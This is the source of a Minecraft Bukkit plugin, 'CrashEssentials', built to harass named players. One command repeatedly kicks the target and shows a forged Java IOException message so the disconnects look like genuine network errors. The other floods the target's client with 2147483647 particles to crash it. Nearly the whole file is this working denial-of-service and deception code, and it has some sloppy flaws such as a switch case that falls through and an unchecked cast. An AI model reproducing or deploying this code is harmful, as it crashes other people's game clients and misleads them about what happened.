package com.romanio0089.crashessentials;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Particle;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {
    @Override
    public void onEnable() {
    	
        getLogger().info("Crash Essentials has been sucessfully enabled !");
    	getServer().getPluginManager().registerEvents(new PlayerJoinMessageListener(null), this);
        getConfig();
    }
	
    @Override
    public void onDisable() {
    	
        getLogger().info("CrashEssentials has been sucessfully disabled !");    
    }
    
    
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
    	
    	Player player = (Player) sender;
    	
    	String lowerCmd = cmd.getName().toLowerCase();
    		
    	switch (lowerCmd) {
    		
    		case "fakejavaerror":
    			
                if (args.length < 2) {
                    player.sendMessage(ChatColor.GRAY + "[" + ChatColor.RED + "CrashEssentials" + ChatColor.GRAY + "] " + ChatColor.RESET + ChatColor.RED + "Not enough arguments! Usage: /fakejavaerror <Player> <Time>");}
                
                if (args.length == 2) {
                    Player target = Bukkit.getPlayerExact(args[0]);
                    
                if (target != null) {
                   String StringTarget = args[0];
                   int KickTimer = Integer.parseInt(args[1]);
                   
                   player.sendMessage(ChatColor.GRAY + "[" + ChatColor.RED + "CrashEssentials" + ChatColor.GRAY + "] " + ChatColor.RESET + ChatColor.GREEN + StringTarget + " has been kicked off the server for " + KickTimer +" seconds.");
                   
          	   	   Bukkit.getScheduler().runTaskTimer(this, new Runnable() {
              	        int KickTime = KickTimer;
              	        public void run() {
                            Player kick = Bukkit.getPlayerExact(args[0]);
              	           	 	if (this.KickTime == 0) {
              	              	  	return;}
                  	            this.KickTime--;
                  	            if (KickTime != 0) {
                  	            	if (kick != null) {
                  	            		kick.kickPlayer("Internal Exception: java.io.IOException: An existing connection was forcibly closed by the remote host");}}}
          	   	   		}, 0L, 20L);}
                	return true;}
                else {
                    player.sendMessage(ChatColor.GRAY + "[" + ChatColor.RED + "CrashEssentials" + ChatColor.GRAY + "] " + ChatColor.RESET + ChatColor.RED + "Your target '" + args[0] + "' is not online!");}
            
    		case "realcrash":
    			
                if (args.length == 0) {
                    player.sendMessage(ChatColor.GRAY + "[" + ChatColor.RED + "CrashEssentials" + ChatColor.GRAY + "] " + ChatColor.RESET + ChatColor.RED + "Not enough arguments!");}
                
                if (args.length == 1) {
                    Player target = Bukkit.getPlayerExact(args[0]);
                    
                if (target != null) {
                    String StringTarget = args[0];
                    Location location = target.getLocation();
                    player.sendMessage(ChatColor.GRAY + "[" + ChatColor.RED + "CrashEssentials" + ChatColor.GRAY + "] " + ChatColor.RESET + ChatColor.GREEN + StringTarget + " has been sucessfully crashed.");
                    target.spawnParticle(Particle.MOB_APPEARANCE, location, 2147483647, 0, 0, 0);
                    target.kickPlayer("Goodbye !");}
                
               else {
                    player.sendMessage(ChatColor.GRAY + "[" + ChatColor.RED + "CrashEssentials" + ChatColor.GRAY + "] " + ChatColor.RESET + ChatColor.RED + "Your target '" + args[0] + "' is not online!");}
                
                return true;}}
		return false;
	}
}